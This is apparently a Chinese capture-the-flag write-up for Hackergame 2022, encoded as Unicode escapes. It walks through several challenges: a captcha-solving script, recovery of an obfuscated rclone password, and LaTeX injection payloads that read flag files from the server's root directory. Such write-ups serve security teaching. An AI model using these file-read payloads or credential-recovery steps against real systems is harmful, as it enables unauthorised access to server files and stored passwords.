\u6765\u5f97\u53ca\u53cd\u5e94\u4e4b\u524d\u987a\u5229\u7b7e\u4e0b 2022\uff0c\u4ece\u800c\u5f97\u5230\u5149\u8363\u7684 flag\uff01 \u4e00\u4e2a\u7f51\u7ad9\uff0c\u624b\u5199\u6570\u5b57\u6210\u529f\u8bc6\u522b\u4e3a 2022 \u5c31\u53ef\u4ee5\u5b8c\u6210\u7b7e\u5230\u3002\u4e0d\u8fc7\u9650\u5236\u4e86\u6bcf\u4e2a\u6570\u5b57\u7684\u65f6\u95f4\uff0c\u4f9d\u6b21\u4e3a 2s\u30011s\u30010.1s\u30010s\u3002 \u6211\u8fd8\u5929\u771f\u5730\u8bd5\u7740\u7b7e\u4e86\u597d\u51e0\u6b21\uff08\u5176\u5b9e\u662f\u6ca1\u6ce8\u610f\u5230\u90a3\u4e2a 0\uff09\uff0c \u75db\u5931\u4e00\u8840 \u3002 \u505a\u6cd5\u5176\u5b9e\u662f\u5728\u6e90\u7801\u91cc\u53d1\u73b0\u8bc6\u522b\u90fd\u5728\u524d\u7aef\u8fdb\u884c\uff0c\u6700\u7ec8\u63d0\u4ea4\u7684\u65f6\u5019\u662f\u8df3\u8f6c\u5230 /?result=.... \u9875\u9762\uff08\u6216\u8005\u4ea4\u4e00\u6b21\u8bd5\u4e00\u4e0b\u4e5f\u80fd\u770b\u51fa\u6765\uff09\u3002\u6240\u4ee5\u76f4\u63a5\u8bbf\u95ee /?result=2022 \u5373\u53ef\u62ff\u5230 flag\uff1a flag{HappyHacking2022-\u2026\u2026} \u732b\u54aa\u95ee\u7b54\u55b5 \u00b6 \u53c2\u52a0\u732b\u54aa\u95ee\u7b54\u55b5\uff0c\u53c2\u52a0\u55b5\u54aa\u95ee\u7b54\u8c22\u8c22\u55b5\u3002 \u7ecf\u5178\u9898\u76ee\uff0c\u641c\u7d22\u5927\u6742\u70e9\u3002\u9664\u4e86\u7b2c\u4e94\u9898\u4ee5\u5916\u8fd8\u662f\u5f88\u5bb9\u6613\u627e\u5230\u7684\u3002\uff08\u8fd9\u6b21\u7adf\u7136\u5206\u4e86\u4e24\u4e2a flag \u51fa\u6765 2333\uff09 .content blockquote ol { margin-top: 0; } \u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66 NEBULA \u6218\u961f\uff08USTC NEBULA\uff09\u662f\u4e8e\u4f55\u65f6\u6210\u7acb\u7684\u55b5\uff1f \u76f4\u63a5\u641c\u7d22\u4e86\u4e00\u4e0b \u201c\u4e2d\u56fd\u79d1\u6280\u5927\u5b66 NEBULA \u6218\u961f\u201d\uff0c\u627e\u5230\u4e86\u4e00\u7bc7\u65b0\u95fb\uff1a \u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u661f\u4e91\uff08Nebula\uff09\u6218\u961f\u5728\u7b2c\u516d\u5c4a\u5f3a\u7f51\u676f\u518d\u521b\u4f73\u7ee9 \uff0c\u5176\u4e2d\u6587\u672b\u6709\u7b80\u5355\u4ecb\u7ecd \u201c\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u661f\u4e91\u6218\u961f\uff08Nebula\uff09\u6210\u7acb\u4e8e 2017 \u5e74 3 \u6708 \u2026\u2026\u201d \u6240\u4ee5\u7b54\u6848\u5c31\u662f 2017-03 \u3002 2022 \u5e74 9 \u6708\uff0c\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u5b66\u751f Linux \u7528\u6237\u534f\u4f1a\uff08LUG @ USTC\uff09\u5728\u79d1\u5927\u6821\u5185\u627f\u529e\u4e86\u8f6f\u4ef6\u81ea\u7531\u65e5\u6d3b\u52a8\u3002\u9664\u4e86\u4e13\u6ce8\u4e8e\u81ea\u7531\u64b8\u732b\u7684\u4e3b\u4f1a\u573a\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u548c\u6280\u672f\u76f8\u5173\u7684\u5206\u4f1a\u573a\uff08\u5982\u95ea\u7535\u6f14\u8bb2 Lightning Talk\uff09\u3002\u5176\u4e2d\u5728\u7b2c\u4e00\u4e2a\u95ea\u7535\u6f14\u8bb2\u4e3b\u9898\u91cc\uff0c\u4e3b\u8bb2\u4eba\u4e8e slides \u4e2d\u5c55\u793a\u4e86\u4e00\u5f20\u5728 GNOME Wayland \u4e0b\u4f7f\u7528 Wayland \u540e\u7aef\u4f1a\u51fa\u73b0\u663e\u793a\u95ee\u9898\u7684 KDE \u7a0b\u5e8f\u622a\u56fe\uff0c\u8bf7\u95ee\u8fd9\u4e2a KDE \u7a0b\u5e8f\u7684\u540d\u5b57\u662f\u4ec0\u4e48\uff1f \u5728 LUG @ USTC \u7684 wiki \u5c31\u80fd\u627e\u5230\u8f6f\u4ef6\u81ea\u7531\u65e5\u6d3b\u52a8\u7684\u9875\u9762\uff1a Software Freedom Day \uff0c\u5176\u4e2d\u53ef\u4ee5\u627e\u5230\u6240\u8bf4\u7684\u90a3\u7bc7 slides\uff1a \u300aGNOME Wayland \u4f7f\u7528\u4f53\u9a8c\uff1a\u4e00\u4e2a\u666e\u901a\u7528\u6237\u7684\u89c6\u89d2\u300b \uff0c\u5176\u4e2d\u7b2c\u5341\u4e94\u9875\u8bb2\u4e86\u6240\u8c13\u7684 KDE \u7a0b\u5e8f\u5728 Wayland \u4e0b\u7684\u663e\u793a\u95ee\u9898\u3002\u4f46\u622a\u56fe\u91cc\u5e76\u6ca1\u6709\u8f6f\u4ef6\u540d\uff0c\u628a\u4e0b\u9762\u4e00\u884c\u5de5\u5177\u680f\u7684\u6587\u672c\u5168\u603c\u5230\u5fc5\u5e94\u91cc\uff0c\u641c\u5230\u4e86 Kdenlive \u7684\u5b98\u65b9\u6587\u6863\u3002 \u6240\u4ee5\u7b54\u6848\u662f Kdenlive \u3002 22 \u5e74\u575a\u6301\uff0c\u5c0f C \u4ecd\u7136\u4f7f\u7528\u7740\u4e00\u53f0\u4ed6\u4ece\u5c0f\u7528\u5230\u5927\u7684 Windows 2000 \u8ba1\u7b97\u673a\u3002\u90a3\u4e48\uff0c\u5728\u4e0d\u53d8\u66f4\u7cfb\u7edf\u914d\u7f6e\u548c\u7a0b\u5e8f\u4ee3\u7801\u7684\u524d\u63d0\u4e0b\uff0cFirefox \u6d4f\u89c8\u5668\u80fd\u5728 Windows 2000 \u4e0b\u8fd0\u884c\u7684\u6700\u540e\u4e00\u4e2a\u5927\u7248\u672c\u53f7\u662f\u591a\u5c11\uff1f \u641c\u7d22 \u201cFirefox Windows 2000\u201d \u53ef\u4ee5\u770b\u5230 Firefox 13 \u4e0d\u518d\u652f\u6301 Windows 2000 \u7684\u5f88\u591a\u65b0\u95fb\u3002 \u6240\u4ee5\u7b54\u6848\u662f 12 \u3002 \u4f60\u77e5\u9053 PwnKit\uff08CVE-2021-4034\uff09\u55b5\uff1f\u636e\u53ef\u9760\u8c23\u4f20\uff0c\u51fa\u9898\u7ec4\u7684\u67d0\u4f4d\u540c\u5b66\u672c\u6765\u60f3\u51fa\u8fd9\u6837\u4e00\u9053\u7c7b\u4f3c\u7684\u9898\uff0c\u4f46\u662f\u53d1\u73b0 Linux \u5185\u6838\u66f4\u65b0\u4e4b\u540e\u5c45\u7136\u4e0d\u518d\u5141\u8bb8 argc \u4e3a 0 \u4e86\u55b5\uff01\u90a3\u4e48\uff0c\u8bf7\u627e\u51fa\u5728 Linux \u5185\u6838 master \u5206\u652f\uff08torvalds/linux.git\uff09\u4e0b\uff0c\u9996\u4e2a\u53d8\u52a8\u6b64\u884c\u4e3a\u7684 commit \u7684 hash \u5427\u55b5\uff01 \u5728 Linux \u5185\u6838 GitHub dev \u9875\u9762\u5168\u5c40\u641c\u7d22\u4e86\u4e00\u4e0b argc == 0\uff0c\u53d1\u73b0\u4e86\u4e00\u4e9b\u68c0\u67e5\u3002\u627e\u5230\u4e2a\u6bd4\u8f83\u50cf\u7684\u8fdb\u5230\u9875\u9762\u91cc blame\uff0c\u627e\u5230\u4e86 commit\uff1a exec: Force single empty string when argv is empty \uff08\u5176\u5b9e commit message \u91cc\u5c31\u5199\u4e86 CVE-2021-4034\uff09\u3002 \u6240\u4ee5\u7b54\u6848\u662f dcd46d897adb70d63e025f175a00a89797d31a43 \u3002 \u901a\u8fc7\u76d1\u89c6\u732b\u54aa\u5728\u952e\u76d8\u4e0a\u770b\u4f3c\u4e71\u8e29\u7684\u6545\u610f\u884c\u4e3a\uff0c\u4e0d\u51fa\u6240\u6599\u53d1\u73b0\u5176\u79d8\u5bc6\u8fde\u4e0a\u4e86\u4e00\u4e2a ssh \u670d\u52a1\u5668\uff0c\u7ec8\u7aef\u663e\u793a ED25519 key fingerprint is MD5:e4:ff:65:d7:be:5d:c8:44:1d:89:6b:50:f5:50:a0:ce. \uff0c\u4f60\u77e5\u9053\u732b\u54aa\u5728\u8fde\u63a5\u4ec0\u4e48\u57df\u540d\u5417\uff1f \u6bd4\u8f83\u96be\u641e\u7684\u4e00\u9053\u9898\uff0c\u60f3\u4e86\u5f88\u957f\u65f6\u95f4\uff0c\u751a\u81f3\u4ee5\u4e3a\u662f\u4e00\u4e9b crypto \u9898\u3002\u4e0d\u8fc7\u6bd5\u7adf\u662f\u4e00\u9053\u641c\u7d22\u9898\uff0c\u4e8e\u662f\u76f4\u63a5\u628a md5 fingerprint \u603c\u5230\u8c37\u6b4c\u91cc\uff0c\u641c\u5230\u4e86\u4e00\u4e2a\u6587\u6863\u5176\u4e2d\u6709\u8fd9\u4e2a\uff08\u53ef\u80fd\u662f\u505a\u4e2a\u4f8b\u5b50\uff09\uff1a Zeek Logs > ssh.log \u3002\u770b\u5230\u91cc\u9762\u5bf9\u5e94\u7684 ip\uff1a205.166.94.16\uff0c\u8bbf\u95ee\u8fdb\u53bb\u770b\u5230\u4e86 sdf.org \u57df\u540d\u3002 \u6240\u4ee5\u7b54\u6848\u662f sdf.org \u3002\uff08\u5176\u5b9e\u662f\u56e4 flag \u9636\u6bb5\u624d\u505a\u51fa\u6765\u7684\uff09 \u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u53ef\u4ee5\u51fa\u6821\u8bbf\u95ee\u56fd\u5185\u56fd\u9645\u7f51\u7edc\u4ece\u800c\u5141\u8bb8\u4e91\u64b8\u732b\u7684\u201c\u7f51\u7edc\u901a\u201d\u5b9a\u4ef7\u4e3a 20 \u5143\u4e00\u4e2a\u6708\u662f\u4ece\u54ea\u4e00\u5929\u6b63\u5f0f\u5b9e\u884c\u7684\uff1f \u641c\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u4e86\u4e00\u7bc7\u901a\u77e5\uff1a \u5173\u4e8e\u5b9e\u884c\u65b0\u7684\u7f51\u7edc\u8d39\u7528\u5206\u62c5\u529e\u6cd5\u7684\u901a\u77e5 \uff0c\u662f 2011 \u5e74 1 \u6708 1 \u65e5\u65bd\u884c\u7684\uff0c\u4f46\u662f\u8fd9\u7bc7\u901a\u77e5\u91cc\u56fd\u9645\u7f51\u7edc\u901a\u8d39\u7528\u5e76\u6ca1\u6709\u6539\u53d8\uff0c\u8fd8\u662f 20 \u5143\u3002\u770b\u6765\u662f\u6bd4\u8f83\u4e45\u8fdc\u7684\u4e8b\u60c5\u4e86\u3002\u641c\u7d22\u540c\u540d\u901a\u77e5\uff0c\u53ef\u4ee5\u53d1\u73b0 \u53e6\u4e00\u7bc7 \u3002\u91cc\u9762\u5199\u4e86\u56fd\u9645\u7f51\u7edc\u901a\u5b9a\u4ef7 20 \u5143\uff0c2003 \u5e74 3 \u6708 1 \u65e5\u5b9e\u884c\u3002 \u6240\u4ee5\u7b54\u6848\u662f 2003-03-01 \u3002 \u4ea4\u4e0a\u53bb\u5f97\u5230\u4e24\u4e2a flag\uff08\u4e00\u4e2a\u662f\u5bf9\u4e09\u9053\u9898\u7684\uff0c\u4e00\u4e2a\u662f\u5bf9\u516d\u9053\u9898\u7684\uff09\uff1a flag{meowexammeow_\u2026\u2026} flag{meowexamfullymeowed!_\u2026\u2026} \u5bb6\u76ee\u5f55\u91cc\u7684\u79d8\u5bc6 \u00b6 \u5b9e\u9a8c\u5ba4\u7ed9\u5c0f K \u5206\u914d\u4e86\u4e00\u4e2a\u9ad8\u6027\u80fd\u670d\u52a1\u5668\u7684\u8d26\u6237\uff0c\u4e3a\u4e86\u4e0d\u7528\u91cd\u65b0\u914d\u7f6e VSCode, Rclone \u7b49\u5c0f K \u5e38\u7528\u7684\u751f\u4ea7\u529b\u5de5\u5177\uff0c\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5f53\u7136\u662f\u628a\u81ea\u5df1\u7684\u5bb6\u76ee\u5f55\u6253\u5305\u62f7\u8d1d\u8fc7\u53bb\u3002 \u4f46\u662f\u5f88\u4e0d\u5de7\uff0c\u5bf9\u5b58\u653e\u4e8e\u5c0f K \u7535\u8111\u91cc\u7684 Hackergame 2022 \u7684 flag \u89ca\u89ce\u5df2\u4e45\u7684 Eve \u540c\u5b66\u6070\u597d\u6700\u8fd1\u62ff\u5230\u4e86\u8fd9\u4e2a\u670d\u52a1\u5668\u7684\u7ba1\u7406\u5458\u6743\u9650\uff08\u901a\u8fc7\u89ca\u89ce\u53e6\u4e00\u4f4d\u540c\u5b66\u7684\u654f\u611f\u4fe1\u606f\uff09\uff0c\u4e8e\u662f\u4e5f\u62ff\u5230\u4e86\u5c0f K \u540c\u5b66\u5bb6\u76ee\u5f55\u7684\u538b\u7f29\u5305\u3002 \u7136\u800c\u66f4\u4e0d\u5de7\u7684\u662f\uff0c\u7531\u4e8e Hackergame \u90e8\u7f72\u4e86\u57fa\u4e8e\u9b54\u6cd5\u7684\u4f5c\u5f0a\u884c\u4e3a\u9884\u77e5\u7cfb\u7edf\uff0cEve \u540c\u5b66\u8fd8\u672a\u6765\u5f97\u53ca\u89e3\u538b\u538b\u7f29\u5305\u5c31\u88ab Z \u540c\u5b66\u63d0\u524d\u6293\u83b7\u3002 \u4e3a\u4e86\u8bc1\u660e Eve \u540c\u5b66\u4e0d\u826f\u4f01\u56fe\u7684\u5371\u5bb3\u6027\uff0c\u4f60\u80fd\u5728\u8fd9\u4e2a\u538b\u7f29\u5305\u91cc\u627e\u5230\u91cd\u8981\u7684 flag \u4fe1\u606f\u5417\uff1f \u7ed9\u4e86\u4e00\u4e2a\u7528\u6237\u5bb6\u76ee\u5f55\u7684\u538b\u7f29\u5305\uff0c\u8fdb\u53bb\u5168\u5c40\u641c\u7d22\u4e00\u4e0b flag \u53ef\u4ee5\u53d1\u73b0 VSCode \u7684\u5386\u53f2\u6587\u4ef6\u91cc\u6709\u4e00\u4e2a DUGV.c \u91cc\u6709\u4e00\u4e2a\u6ce8\u91ca\u6389\u7684 flag\uff1a flag{finding_everything_through_vscode_config_file_\u2026\u2026} \uff08\u62a2\u4e86\u4e2a\u4e00\u8840 2333\uff09 \u7b2c\u4e8c\u90e8\u5206\u8fd8\u662f\u6709\u4e9b\u590d\u6742\u7684\u3002\u641c flag \u7684\u65f6\u5019\u8fd8\u53ef\u4ee5\u53d1\u73b0 .config/rclone/rclone.conf \u91cc\u6709\u4e00\u4e2a\u540d\u4e3a flag2 \u7684\u914d\u7f6e\u9879\uff1a [flag2] type = ftp host = ftp . example . com user = user pass = tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ \u6ca1\u7528\u8fc7 rclone\uff0c\u81ea\u5df1\u88c5\u4e86\u4e00\u4e2a\u8bd5\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0 pass \u662f\u6df7\u6dc6\u540e\u7684\uff0c\u800c\u4e14\u662f\u968f\u673a\u7684\uff0c\u6709\u4e00\u4e2a\u547d\u4ee4 rclone obscure \u53ef\u4ee5\u7528\u6765\u6df7\u6dc6\u5bc6\u7801\u3002\u6587\u6863\u91cc\u4e5f\u8bf4\u4e86\u6df7\u6dc6\u7684\u76ee\u7684\u4e5f\u53ea\u662f\u9632\u6b62\u6709\u4eba\u53ef\u4ee5\u4e00\u773c\u770b\u5230\u5bc6\u7801\u800c\u5df2\uff0c\u5e76\u6ca1\u6709\u52a0\u5bc6\uff0crclone \u662f\u53ef\u4ee5\u76f4\u63a5\u590d\u539f\u660e\u6587\u7684\u3002\u4e8e\u662f\u5c31\u7ffb\u4e86\u4e0b rclone \u6e90\u7801\uff0c\u53ef\u4ee5\u5728 obscure \u76f8\u5173\u6e90\u7801 \u91cc\u627e\u5230\u6062\u590d\u76f8\u5173\u7684\u51fd\u6570 Reveal\uff0c\u590d\u5236\u4e0b\u6765\u8dd1\u4e00\u4e0b\u7ed9\u51fa\u7684 pass \u5373\u53ef\u4ee5\u6062\u590d\u5bc6\u7801\uff0c\u5373\uff1a flag{get_rclone_password_from_config!_\u2026\u2026} HeiLang \u00b6 \u6765\u81ea Heicore \u793e\u533a\u7684\u65b0\u4e00\u4ee3\u7f16\u7a0b\u8bed\u8a00 HeiLang\uff0c\u57fa\u4e8e\u7b2c\u4e09\u4ee3\u5927\u87d2\u86c7\u8bed\u8a00\uff0c\u4f46\u662f\u629b\u5f03\u4e86\u539f\u6709\u7684\u96be\u4ee5\u7406\u89e3\u7684 | \u8fd0\u7b97\uff0c\u5347\u7ea7\u4e3a\u4e86\u66f4\u52a0\u5148\u8fdb\u7684\u8bed\u6cd5\uff0c\u7528 A[x | y | z] = t \u6765\u8868\u793a\u4e4b\u524d\u590d\u6742\u7684 A[x] = t; A[y] = t; A[z] = t\u3002 \u4f5c\u4e3a\u4e00\u4e2a\u7f16\u7a0b\u7231\u597d\u8005\uff0c\u6211\u89c9\u5f97\u5b9e\u5728\u662f\u592a\u9177\u4e86\uff0c\u5f88\u7b26\u5408\u6211\u5bf9\u672a\u6765\u7f16\u7a0b\u8bed\u8a00\u7684\u60f3\u8c61\uff0c\u79d1\u6280\u5e76\u5e26\u7740\u8da3\u5473\u3002 \u9898\u7ed9\u4e86\u4e00\u4e2a\u4ee5\u8fd9\u79cd\u8bed\u6cd5\u5199\u7684\u751f\u6210\u6570\u7ec4\u7684\u4ee3\u7801\uff0c\u4ee5\u53ca\u9a8c\u8bc1\u7ed3\u679c\u7684 python \u4ee3\u7801\u3002\u5176\u5b9e\u9898\u76ee\u5df2\u7ecf\u8bf4\u7684\u5f88\u660e\u786e\u4e86\uff0c\u4e0d\u8fc7\u61d2\u5f97\u5199\uff0c\u8bb0\u5f97 GitHub \u4e0a\u770b\u5230\u8fc7\u4e00\u4e2a\u9879\u76ee HeLang \uff0c\u4e0d\u8fc7\u91cc\u9762\u7684\u6570\u7ec4\u4e0b\u6807\u4ece 1 \u5f00\u59cb\uff0c\u6240\u4ee5\u5c31\u5199\u4e86\u6bb5\u4ee3\u7801\u6765\u5c06 [] \u4e2d\u7684\u6570\u90fd\u52a0\u4e00\uff0c\u8dd1\u4e00\u904d\u8f93\u51fa\u6570\u7ec4 a\uff0c\u7136\u540e\u66ff\u4ee3\u539f\u6765\u6587\u4ef6\u91cc\u7684\u90e8\u5206\uff0c\u8dd1\u4e00\u4e0b\u5c31\u53ef\u4ee5\u62ff\u5230 flag\uff1a flag{6d9ad6e9a6268d96-97091f6fffb6935c} Xcaptcha \u00b6 \u9898\u76ee\u592a\u957f\u4e86\uff0c\u7701\u7565\u4e86\u90e8\u5206\u80cc\u666f\u6545\u4e8b \u4f17\u4eba\u76ee\u76ee\u76f8\u89d1\u3002 \u300c\u6211\u6765\u8bd5\u8bd5\u3002\u300d\uff0c\u4e00\u540d\u961f\u5458\u4e0a\u524d\u70b9\u51fb\u4e86\u6309\u94ae\u3002\u7136\u540e\uff0c\u5c4f\u5e55\u663e\u793a\u300c\u8bf7\u5728\u4e00\u79d2\u5185\u5b8c\u6210\u4ee5\u4e0b\u52a0\u6cd5\u8ba1\u7b97\u300d\u3002 \u8fd8\u6ca1\u7b49\u53cd\u5e94\u8fc7\u6765\uff0c\u5c4f\u5e55\u4e0a\u7684\u5b57\u53c8\u5f00\u59cb\u53d8\u5e7b\uff0c\u663e\u793a\u7740\u300c\u9a8c\u8bc1\u5931\u8d25\u300d\u3002\u800c\u4f60\u4f5c\u4e3a\u7a81\u51fb\u961f\u4e2d\u552f\u4e00\u7684\u9ed1\u5ba2\uff0c\u5168\u6751\u4eba\u6c11\u6700\u540e\u7684\u5e0c\u671b\uff0c\u8fce\u7740\u7eb7\u7eb7\u6295\u6765\u7684\u76ee\u5149\uff0c\u80fd\u5426\u5728\u89c4\u5b9a\u65f6\u95f4\u5185\u5b8c\u6210\u9a8c\u8bc1\uff0c\u6253\u5f00\u673a\u623f\uff0c\u4e0d\uff0c\u63a8\u5f00\u548c\u5e73\u65f6\u4ee3\u7684\u5927\u95e8\uff1f \u5927\u6982\u5c31\u662f\u70b9\u51fb\u8ba4\u8bc1\u540e\u5728\u4e00\u79d2\u5185\u8ba1\u7b97\u4e09\u4e2a\u5927\u6574\u6570\u52a0\u6cd5\u7136\u540e\u63d0\u4ea4\u3002\u624b\u5feb\u5b58\u4e00\u4efd html\uff0c\u6309\u7167\u5176\u4e2d\u8981\u6c42\u6b63\u5219\u4e00\u4e0b\u63d0\u53d6\u51fa\u7b97\u5f0f\u7136\u540e\u505a\u52a0\u6cd5\u518d post \u56de\u53bb\u3002 import re , requests url = \"http://202.38.93.111:10047/xcaptcha\" s = requests . session () s . get ( \"http://202.38.93.111:10047/?token=\u2026\u2026\" ) res = re . findall ( r \">(\\d*?)\\+(\\d*?) \" , s . get ( url ) . text ) print ( s . post ( url , data = { f 'captcha { i + 1 } ' : str ( int ( res [ i ][ 0 ]) + int ( res [ i ][ 1 ])) for i in range ( 3 )}) . text ) \uff08 \u7ecf\u5178\u538b\u884c \uff09\u8dd1\u4e00\u4e0b\u62ff\u5230 flag\uff1a flag{head1E55_br0w5er_and_ReQuEsTs_areallyour_FR1ENd_\u2026\u2026} LaTeX \u673a\u5668\u4eba \u00b6 \u5728\u7f51\u4e0a\u793e\u4ea4\u7fa4\u7ec4\u4e2d\u4ea4\u6d41\u6570\u5b66\u548c\u7269\u7406\u95ee\u9898\u65f6\uff0c\u603b\u662f\u514d\u4e0d\u4e86\u8f93\u5165\u516c\u5f0f\u3002\u800c\u663e\u7136\u5927\u591a\u6570\u5e38\u7528\u7684\u804a\u5929\u8f6f\u4ef6\u5e76\u4e0d\u80fd\u505a\u5230\u8fd9\u4e00\u70b9\u3002\u4e3a\u4e86\u65b9\u4fbf\u5927\u5bb6\u5728\u6c34\u7fa4\u548c\u5356\u5f31\u4e4b\u4f59\u80fd\u591f\u9ad8\u6548\u5730\u8fdb\u884c\u5b66\u672f\u4ea4\u6d41\uff0cG \u793e\u7684\u540c\u5b66\u5236\u4f5c\u4e86\u4e00\u4e2a\u7b80\u5355\u6613\u7528\u7684\u5c06 LaTeX \u516c\u5f0f\u4ee3\u7801\u8f6c\u6362\u6210\u56fe\u7247\u7684\u7f51\u7ad9\uff0c\u5e76\u901a\u8fc7\u804a\u5929\u673a\u5668\u4eba\u5728\u7fa4\u91cc\u5b9e\u65f6\u5c06\u7fa4\u53cb\u53d1\u9001\u7684\u516c\u5f0f\u8f6c\u6362\u6210\u56fe\u7247\u53d1\u51fa\u3002 \u8fd9\u4e2a\u7f51\u7ad9\u7684\u601d\u8def\u4e5f\u5f88\u76f4\u63a5\uff1a\u628a\u7528\u6237\u8f93\u5165\u7684 LaTeX \u63d2\u5165\u5230\u4e00\u4e2a\u5199\u597d\u5934\u90e8\u548c\u5c3e\u90e8\u7684 TeX \u6587\u4ef6\u4e2d\uff0c\u5c06\u6587\u4ef6\u7f16\u8bd1\u6210 PDF\uff0c\u518d\u5c06 PDF \u88c1\u526a\u6210\u5927\u5c0f\u5408\u9002\u7684\u56fe\u7247\u3002 \u201cLaTeX \u53c8\u4e0d\u662f\u88ab\u7f16\u8bd1\u6267\u884c\u7684\u4ee3\u7801\uff0c\u8fd9\u79cd\u4e1c\u897f\u4e0d\u4f1a\u6709\u4e8b\u7684\u3002\u201d \u7269\u7406\u51fa\u8eab\u7684\u5f00\u53d1\u8005\u4eec\u660e\u663e\u4e0d\u662f\u592a\u5728\u610f\u8fd9\u4e2a\u7f51\u7ad9\u7684\u5b89\u5168\u95ee\u9898\uff0c\u4e5f\u6ca1\u6709\u5bf9\u7528\u6237\u7684\u8f93\u5165\u505a\u4efb\u4f55\u68c0\u67e5\u3002 \u90a3\u4f60\u80fd\u60f3\u529e\u6cd5\u83b7\u5f97\u670d\u52a1\u5668\u4e0a\u653e\u5728\u6839\u76ee\u5f55\u4e0b\u7684 flag \u5417\uff1f \u7eaf\u6587\u672c \u7b2c\u4e00\u4e2a flag \u4f4d\u4e8e /flag1\uff0cflag \u82b1\u62ec\u53f7\u5185\u7684\u5185\u5bb9\u7531\u7eaf\u6587\u672c\u7ec4\u6210\uff08\u5373\u53ea\u5305\u542b\u5927\u5199\u5c0f\u5199\u5b57\u6bcd\u548c\u6570\u5b57 0-9\uff09\u3002 \u7279\u6b8a\u5b57\u7b26\u6df7\u5165 \u7b2c\u4e8c\u4e2a flag \u4f4d\u4e8e /flag2\uff0c\u8fd9\u6b21\uff0cflag \u82b1\u62ec\u53f7\u5185\u7684\u5185\u5bb9\u9664\u4e86\u5b57\u6bcd\u548c\u6570\u5b57\u4e4b\u5916\uff0c\u8fd8\u6df7\u5165\u4e86\u4e24\u79cd\u7279\u6b8a\u5b57\u7b26\uff1a\u4e0b\u5212\u7ebf\uff08_\uff09\u548c\u4e95\u53f7\uff08#\uff09\u3002\u4f60\u53ef\u80fd\u9700\u8981\u60f3\u4e9b\u5176\u4ed6\u529e\u6cd5\u4e86\u3002 \u7b2c\u4e00\u4e2a flag \u5f88\u7b80\u5355\uff0c\u53ea\u9700\u8981 input \u4e00\u4e0b\u5373\u53ef\uff1a \\input{/flag1} \uff0c\u53ef\u4ee5\u770b\u5230 flag\uff1a flag{becAr3fu11dUd3\u2026\u2026} \u3002 \u7b2c\u4e8c\u4e2a flag \u56e0\u4e3a\u91cc\u9762\u5305\u542b\u7279\u6b8a\u5b57\u7b26\uff0c\u6240\u4ee5\u5728\u6e32\u67d3\u7684\u65f6\u5019\u4f1a\u51fa\u73b0\u9519\u8bef\u3002\u89e3\u51b3\u65b9\u6848\u662f\u5229\u7528 LaTeX \u7684 active character \u6982\u5ff5 \u6765\u5c06 _ \u548c # \u66ff\u6362\u4e3a \\_ \u548c \\#\uff0c\u5148\u5c06\u5176\u5b57\u7b26\u7684 catcode \u8bbe\u7f6e\u4e3a \\active\uff0c\u7136\u540e\u5b9a\u4e49\u547d\u4ee4\u5e8f\u5217\u3002payload \u4e3a\uff1a $$ \\catcode ` \\_ = \\active \\def _{ \\_ } \\catcode ` \\# = \\active \\def #{ \\# } \\input { / flag 2 } $$ \u5f97\u5230 flag\uff1a flag{latex_bec_0_m##es_co__#ol_\u2026\u2026} \u94fe\u4e0a\u8bb0\u5fc6\u5927\u5e08 \u00b6 \u542c\u8bf4\u4f60\u5728\u533a\u5757\u94fe\u4e0a\u90e8\u7f72\u7684\u667a\u80fd\u5408\u7ea6\u6709\u8fc7\u76ee\u4e0d\u5fd8\u7684\u80fd\u529b\u3002 \u7b2c\u4e00\u9053\u9898\u9898\u76ee\u5408\u7ea6\uff1a pragma solidity = 0.8.17 ; interface MemoryMaster { function memorize ( uint256 n ) external ; function recall () external view returns ( uint256 ); } contract Challenge { function test ( MemoryMaster m , uint256 n ) external returns ( bool ) { m . memorize ( n ); uint256 recalled = m . recall (); return recalled == n ; } } \u5f88\u7b80\u5355\uff0c\u5199\u4e00\u4e2a\u5408\u7ea6\u5b58\u503c\uff0c\u5b9e\u73b0 memorize \u548c recall \u65b9\u6cd5\u5b58\u53d6\u503c\u5373\u53ef\uff1a pragma solidity = 0.8.17 ; contract Exploit { uint256 num ; function memorize ( uint256 n ) external { num = n ; } function recall () external view returns ( uint256 ) { return num ; } } Remix \u91cc\u7f16\u8bd1\u7136\u540e\u4e0a\u4f20\u5373\u53ef\uff0cflag\uff1a flag{Y0u_Ar3_n0w_f4M1l1ar_W1th_S0l1dity_st0rage_\u2026\u2026} \u7b2c\u4e00\u9898\u62a2\u4e86\u4e00\u8840\u3002\u7b2c\u4e8c\u4e09\u9898\u770b\u4e86\u5c5e\u5b9e\u8499\u5708\u3002\u7b2c\u4e8c\u9898\u5728\u8c03\u7528 memorize \u4e4b\u540e\u63a5\u4e86\u4e00\u4e2a revert \u6062\u590d\u72b6\u6001\u53d8\u5316\u3002\u7b2c\u4e09\u9898\u9650\u5b9a memorize \u65b9\u6cd5\u4e3a view \u51fd\u6570\uff0c\u5373\u4e0d\u80fd\u4fee\u6539\u72b6\u6001\u3002\u611f\u89c9\u5f88\u795e\u5947\uff0c\u53ef\u80fd\u662f\u7528\u4e86\u67d0\u4e9b EVM \u7279\u6027\u5427\u3002\u8e72 wp \u5b66\u5b66\u3002 \u65c5\u884c\u7167\u7247 2.0 \u00b6 \u4f60\u7684\u5b66\u957f\u51b3\u5b9a\u6765\u4e00\u573a\u84c4\u8c0b\u5df2\u4e45\u7684\u65c5\u884c\u3002\u901a\u8fc7\u4ed6\u53d1\u7ed9\u4f60\u7684\u7167\u7247\u6765\u770b\uff0c\u9152\u5e97\u5e94\u8be5\u662f\u53c8\u88ab\u4ed6\u4f4f\u4e0b\u4e86\u3002 \u7167\u7247\u5206\u6790 \u00b6 .content blockquote ol { margin-top: 0; } \u7b2c\u4e00\u90e8\u5206\u662f\u4e94\u4e2a\u5173\u4e8e\u56fe\u7247 exif \u4fe1\u606f\u7684\u95ee\u9898\uff0c\u76f4\u63a5\u4f7f\u7528 exiftool \u8bfb\u53d6\u5373\u53ef\uff1a 